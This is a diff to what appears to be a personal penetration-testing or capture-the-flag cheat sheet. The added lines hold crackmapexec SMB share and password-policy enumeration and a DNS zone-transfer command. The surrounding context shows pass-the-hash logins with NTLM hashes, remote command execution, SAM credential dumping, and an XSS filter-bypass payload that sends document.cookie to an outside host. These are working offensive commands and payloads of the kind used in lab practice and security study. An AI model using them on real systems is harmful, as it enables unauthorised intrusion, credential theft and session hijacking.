@@ -349,6 +349,9 @@ crackmapexec smb 10.10.10.10 -u aniq -p pass.txt
 crackmapexec smb 10.200.3.1/24 -u administrator -d domain.local -H 'NTLM'
 crackmapexec smb 172.16.1.101 -u wsadmin -H '669b12a3bac275251170afbe2c5de8c2' -x 'whoami'
 crackmapexec smb 10.10.110.24 -u wsadmin -H '00000000000000000000000000000000' --sam
+crackmapexec smb 10.10.10.14 -u salvador -p "password" --shares --pass-pol
+#more cheatsheets
+https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
 
 [xss bypass]
 <SCRscriptIPT>document.location='http://10.14.3.113/ape.js?c='+document.cookie</SCRscriptIPT>
@@ -617,3 +620,6 @@ get <item>
 
 [bypassing cheatsheet]
 https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md
+
+[dns | dig]
+dig axfr @192.168.0.102 webmaster.htb
